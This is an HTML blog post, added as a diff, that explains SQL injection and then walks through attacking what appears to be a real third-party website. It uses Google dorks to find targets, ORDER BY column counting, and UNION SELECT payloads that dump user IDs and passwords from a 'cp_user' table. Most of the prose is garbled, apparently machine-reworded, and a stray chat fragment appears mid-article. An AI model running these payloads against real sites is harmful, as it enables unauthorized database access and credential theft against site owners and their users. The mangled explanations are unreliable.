@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title> - Hacksec</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="yandex-verification" content="e598ba3f5d83f9cd" />
+  <link rel="icon" href="https://blog.hacksec.infavicon.png">
+
+  
+  
+  <link rel="stylesheet" href="/css/style.min.716f2dd87366be75c50babe0495f6f831c4925ca6f6a0c66c83ac32c4a258f16.css">
+  
+
+  
+    
+    <meta property="og:title" content=""/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://blog.hacksec.in/posts/sqli/"/>
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@hacksec42"/>
+    <meta name="twitter:creator" content="@hacksec42"/>
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet"> 
+</head>
+
+
+
+
+<body class='page frame page-blog-single'>
+  <div id="wrapper" class="wrapper">
+    <div class='header'>
+  <a class="header-logo" href="https://blog.hacksec.in">Hacksec</a>
+  <div class="menu-main">
+    <ul>
+        
+        
+            <li class="menu-item-about">
+                <a href="/pages/about/">About</a>
+            </li>
+        
+            <li class="menu-item-posts">
+                <a href="/posts/">Posts</a>
+            </li>
+        
+    </ul>
+  </div>
+</div>
+    
+  <div class="blog">
+    
+    <div class="intro">
+      <h1><span class="dot">.</span></h1>
+      
+    </div>
+    <div class="content">
+      <h2 id="what-is-an-sql-injection-attack">What is an SQL injection attack</h2>
+<p>SQL Injection assaults (or SQLi) adjust SQL inquiries, infusing malignant code by utilizing weaknesses.</p>
+<p>Effective SQLi assaults permit aggressors to change data set data, access delicate information, execute administrator assignments on the data set, and recuperate documents from the framework. At times aggressors can give orders to the basic information base working framework.</p>
+<h2 id="how-do-sql-injection-attacks-work">How do SQL injection attacks work?</h2>
+<p>Most applications permit their clients to include information somehow, and web applications are the same. Vindictive people can manhandle those information entering components in manners that meddle with the age of SQL inquiries.</p>
+<p>The things I call &ldquo;information entering systems&rdquo; are how clients input information into the application. More often than not, these future structure fields and URL boundaries. By fiddling with those components perfectly, assailants can infuse—consequently the name—extra SQL orders, which get executed.</p>
+<h3 id="few-sorts-of-sql-injection">Few sorts of SQL injection</h3>
+<p>—the following are a couple of normal variations.</p>
+<h3 id="sql-injection-based-on-user-input">SQL injection based on user input</h3>
+<p>A fundamental SQL injection assault utilizes client inputs. Web applications acknowledge inputs through structures, which pass a client&rsquo;s contribution to the information base for handling. If the web application recognizes these contributions without cleaning them, an assailant can inject SQL proclamations through structure fields and erase, duplicate, or adjust the substance of the data set.</p>
+<h3 id="sql-injection-based-on-cookies">SQL injection based on cookies</h3>
+<p>One more way to deal with SQL injection is changing cookies to &ldquo;poison&rdquo; information base questions. Web applications regularly load cookies and utilize their information as a component of data set tasks. A malignant client, or malware conveyed on a client&rsquo;s gadget, could adjust cookies to SQL in an unforeseen way into the backend information base.</p>
+<h3 id="sql-injection-based-on-http-headers">SQL injection based on HTTP headers</h3>
+<p>Server factors such as HTTP headers can likewise be utilized for SQL injection. On the off chance that a web application acknowledges inputs from HTTP headers, counterfeit headers containing subjective SQL can code into the data set.</p>
+<h3 id="second-order-sql-injection">Second-order SQL injection</h3>
+<p>These are potentially the most intricate SQL injection assaults since they might lie lethargic for an extensive period. A second-order SQL injection assault conveys harmed information, which may be viewed as harmless in one setting; however, it is vindictive in another specific circumstance. Regardless of whether designers disinfect all application inputs, they could, in any case, be defenseless against this kind of assault.</p>
+<h2 id="impact-of-sql-injection-attacks">Impact of SQL Injection Attacks</h2>
+<p>The following are a couple of instances of the damage SQL injection assaults can cause of an association, if successful.</p>
+<h4 id="find-credentials-">Find credentials —</h4>
+<p>SQL infusions can be utilized to discover client qualifications. Assailants would then be able to mimic these clients and use their advantages.</p>
+<h4 id="access-database-">Access database —</h4>
+<p>Assailants can utilize SQL injection to access the data put away in a data set server.</p>
+<h2 id="explanation-of-sql-injection-vulnerability">Explanation of SQL Injection Vulnerability</h2>
+<p>As the name recommends, a SQL injection weakness authorized an attacker to infuse vindictive contribution to a SQL articulation. To completely understand the issue, we initially need to see how server-side prearranged language handles SQL queries.</p>
+<p>For instance, suppose usefulness in the web application creates a string with the accompanying SQL explanation:</p>
+<p>$statement = &ldquo;SELECT * FROM users WHERE username = &lsquo;ravi&rsquo; AND password = &lsquo;hacksec&rsquo;&quot;;</p>
+<p>This SQL articulation is passed to a capacity that sends the string to the associated information base, where it is parsed, executed, and returns an outcome.</p>
+<p>As you would have seen, the assertion contains some new, unique characters:</p>
+<ul>
+<li>
+<p>*(asterisk) is a guide for the SQL data set to return all sections for the chosen information base column.</p>
+</li>
+<li>
+<p>= (equal ) is guidance for the SQL data set return esteems that match the looked through h string.</p>
+</li>
+</ul>
+<p>Mr.Bl@ck_H3x, [18.10.21 01:47]</p>
+<ul>
+<li>' (single statement mark) is utilized to tell the SQL information base where the pursuit string starts or closures</li>
+</ul>
+<p>Presently consider the accompanying model where a site client can change the upsides of &lsquo;$user&rsquo; and &lsquo;$password, for example, in a login structure:</p>
+<p>$statement = &ldquo;SELECT * FROM users WHERE username = &lsquo;$user&rsquo; AND password= &lsquo;$password&rsquo;&quot;;</p>
+<p>An attacker can, without much of a stretch, supplement any unique SQL linguistic structure inside the statement if the application doesn&rsquo;t disinfect the info:</p>
+<p>$statement = &ldquo;SELECT * FROM users WHERE username = &lsquo;admin&rsquo;; &ndash; ' AND password= &lsquo;anything&rsquo;&quot;;= &lsquo;anything&rsquo;&quot;;</p>
+<p>What&rsquo;s going on here?  (admin&rsquo;; &ndash;) is the aggressor&rsquo;s feedback, which contains two new, extraordinary characters:</p>
+<ul>
+<li>
+<p>; (semicolon) is utilized for training the SQL parser that the current assertion has finished (excessive much of the time).</p>
+</li>
+<li>
+<ul>
+<li>(twofold dash) teaches the SQL parser that the remainder of the line is a remark and ought not to be executed.</li>
+</ul>
+</li>
+</ul>
+<p>This SQL injection successfully eliminates the secret phrase confirmation and returns a dataset for a current client – &lsquo;admin&rsquo; for this situation. The attacker would now be able to sign in with a manager account without determining a secret word.</p>
+<h4 id="database">Database:</h4>
+<p>The database is an assortment of information. From a site perspective, data set is utilized for putting away client ids, passwords, web page subtleties, and that&rsquo;s only the tip of the iceberg.</p>
+<p>Some List of Database are:</p>
+<ul>
+<li>
+<p>DB servers,</p>
+</li>
+<li>
+<p>MySQL(Open source),</p>
+</li>
+<li>
+<p>MSSQL,</p>
+</li>
+<li>
+<p>MS-ACCESS,</p>
+</li>
+<li>
+<p>Oracle,</p>
+</li>
+<li>
+<p>Postgre SQL(open source),</p>
+</li>
+<li>
+<p>SQLite</p>
+</li>
+</ul>
+<h2 id="lets-move-to-the-live-example">let&rsquo;s move to the live example</h2>
+<h4 id="stage-1-finding-vulnerable-website">Stage 1: Finding Vulnerable Website:</h4>
+<p>Our best accomplice for SQL injection is Google. We can track down the Vulnerable websites(hackable sites) utilizing the Google Dork list. Google dimwit is looking for weak sites using google looking through stunts. There is part of stunts to look in google. In any case, we will utilize &ldquo;inurl:&rdquo; order for tracking down the weak sites.</p>
+<p>A few Examples:</p>
+<ul>
+<li>
+<p>inurl:index.php?id=</p>
+</li>
+<li>
+<p>inurl:gallery.php?id=</p>
+</li>
+</ul>
+<h4 id="stage-2-checking-the-vulnerability">Stage 2: Checking the Vulnerability:</h4>
+<p>Presently we should take a look at the weakness of sites. To look at the fault, add the single statements(') toward the finish of the URL and hit enter. (No space between the number and single statements)</p>
+<p>Example:-</p>
+<blockquote>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1'">http://www.pha.org.pk/sro_list.php?catid=1'</a></p>
+</blockquote>
+<p><img src="https://i.postimg.cc/7hNkF34G/1-step.png" alt="enter image description here"></p>
+<p>Suppose the page stays on the same page or shows that page not found or shows some different website pages. Then, at that point, it isn&rsquo;t defenseless.</p>
+<p>If it is showing any mistakes which are identified with SQL query, then it is powerless.</p>
+<h4 id="stage-3-finding-number-of-columns">Stage 3: Finding Number of columns:</h4>
+<p>Presently we have discovered the site is powerless. The subsequent stage is to track down the number of columns in the table.</p>
+<p>For that, supplant the single statements(') with &ldquo;request by a&rdquo; statement. (leave one space among numbers and request by n explanation)</p>
+<p>Change from 1,2,3,4, 5,6,… n. Until you get the blunder like &ldquo;obscure columns. &quot;
+Example:</p>
+<blockquote>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 1<br>
+<a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 2<br>
+<a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 3<br>
+<a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 4</p>
+</blockquote>
+<p><img src="https://i.postimg.cc/rwskHRPs/step-2.png" alt="enter image description here"></p>
+<p>change the number until you get the mistake as &ldquo;obscure segment.&rdquo;</p>
+<p>Assuming you get the blunder while attempting the &ldquo;x&quot;th number, no of the segments is &ldquo;x-1&rdquo;.</p>
+<p>Ex.</p>
+<p>` <a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 1&ndash;(no error)</p>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 2&ndash;(no error)</p>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 3&ndash;(no error)</p>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 4&ndash;(no error)</p>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 5&ndash;(no error)</p>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=1">http://www.pha.org.pk/sro_list.php?catid=1</a> order by 6&ndash;(error)`</p>
+<p>so presently x=6 , The quantity of segment is x-1 i.e, 5.</p>
+<p><img src="https://i.postimg.cc/4yPDLXvp/3-step.png" alt="enter image description here"></p>
+<p>At some point the above may not work. At the time add the &ldquo;– &quot; toward the finish of the assertion.</p>
+<h4 id="stage-4-displaying-the-vulnerable-sections">Stage 4: Displaying the Vulnerable sections:</h4>
+<p>Utilizing &ldquo;association select columns_sequence&rdquo; we can track down the weak piece of the table. Supplant the &ldquo;request by n&rdquo; with this assertion. Furthermore, change the id worth to negative(i mean id=-2, must change, but in some sites might work without evolving).</p>
+<p>Supplant the columns_sequence with the no from 1 to x-1(number of sections) isolated with commas(,).</p>
+<p>on the off chance that the quantity of segments is 5 ,the query is as follow:-</p>
+<p><code>http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,3,4,5--+---</code></p>
+<p>It will show a few numbers in the page(it should be not exactly &lsquo;x&rsquo; esteem, I mean not exactly or equl to number of sections).</p>
+<p><img src="https://i.postimg.cc/6qxZjX66/step-4.png" alt="enter image description here"></p>
+<p>Presently select 1 number.
+It showing 3,4. How about we take Number 3.</p>
+<h4 id="stage-5-finding-the-table-name">Stage 5: Finding the Table Name</h4>
+<p>Presently we need to track down the table name of the information base. Supplant the 3 with “group_concat(table_name) and add the “from information_schema.tables where table_schema=database()”</p>
+<p>Ex.</p>
+<p><code>http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(table_name,0x3c6c693e),4,5 from information_schema.tables where table_schema=database()--+-</code></p>
+<p>0x3c6c693e this one use to list</p>
+<p><img src="https://i.postimg.cc/tTQ7yNK2/step-5.png" alt="enter image description here"></p>
+<p>Now select the “cp_user ” table.</p>
+<h4 id="stage-6-finding-the-column-name">Stage 6: Finding the Column Name</h4>
+<p>Presently supplant the &ldquo;group_concat(table_name) with the &ldquo;group_concat(column_name)&rdquo;</p>
+<p>Supplant the &ldquo;from information_schema.tables where table_schema=database()– &quot; with &ldquo;FROM information_schema.columns WHERE table_name=mysqlchar–</p>
+<p>Presently listen cautiously,we need to discover convert the table name to MySql CHAR() string and supplant mysqlchar with that.</p>
+<p>Discover MysqlChar() for Tablename:</p>
+<p>Most importantly, introduce the HackBar addon: <a href="https://github.com/Xero-Zero/HackBar-Mod-Pro-">https://github.com/Xero-Zero/HackBar-Mod-Pro-</a></p>
+<p>select sql-&gt;Mysql-&gt;MysqlChar()</p>
+<p>Reorder the code toward the finish of the url rather than the &ldquo;mysqlchar&rdquo;</p>
+<p>Ex.</p>
+<blockquote>
+<p><a href="http://www.pha.org.pk/sro_list.php?catid=-1">http://www.pha.org.pk/sro_list.php?catid=-1</a> +UNION+ALL+SELECT+1,2,group_concat(column_name,0x3c6c693e),4,5 from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)&ndash;+-</p>
+</blockquote>
+<p><img src="https://i.postimg.cc/43tN8hYt/step-6.png" alt="### (img 6)"></p>
+<p>Presently it will show the rundown of sections.</p>
+<p>like -</p>
+<ul>
+<li>u_name</li>
+<li>u_id</li>
+<li>u_pass</li>
+<li>u_type</li>
+<li>is_active ..</li>
+</ul>
+<p>Presently supplant the supplant group_concat(column_name) with group_concat(columnname,0x3c6c693e,another column name).</p>
+<p>Column name ought to be supplanted from the recorded segment name.</p>
+<p>Another column name ought to be supplanted from the recorded segment name.</p>
+<p>Presently supplant the &quot; from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)&rdquo; with the &ldquo;from table_name&rdquo;</p>
+<p>Ex:</p>
+<blockquote>
+<p><code>http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(u_id,0x3c6c693e,u_pass),4,5 from cp_user--+-</code></p>
+</blockquote>
+<p><img src="https://i.postimg.cc/9f1NHLwj/7.png" alt="enter image description here"></p>
+<p>At some point, it will show the section isn&rsquo;t found.
+Then, at that point, attempt another section names
+Presently it will have a Username and passwords.
+Appreciate</p>
+
+    </div>
+  </div>
+
+    <div class="footer">
+  
+  <div class="footer-social">
+    
+    <span class="social-icon social-icon-twitter">
+      <a href="https://twitter.com/hacksec42" title="twitter" target="_blank" rel="noopener">
+        <img
+          src="/images/social/twitter.svg"
+          width="24"
+          height="24"
+          alt="twitter"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+    <span class="social-icon social-icon-github">
+      <a href="https://github.com/hacksec-in" title="github" target="_blank" rel="noopener">
+        <img
+          src="/images/social/github.svg"
+          width="24"
+          height="24"
+          alt="github"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+    <span class="social-icon social-icon-linkedin">
+      <a href="https://www.linkedin.com/in/rishi-roy-a986381a6/" title="linkedin" target="_blank" rel="noopener">
+        <img
+          src="/images/social/linkedin.svg"
+          width="24"
+          height="24"
+          alt="linkedin"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+  </div>
+  
+</div>
+
+  </div>
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/bundle.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js"></script>
+  
+
+  
+  
+
+  
+  
+  
+    
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-204818072-3"></script>
+      <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-204818072-3');
+      </script>
+    
+  
+
+
+</body>
+</html>
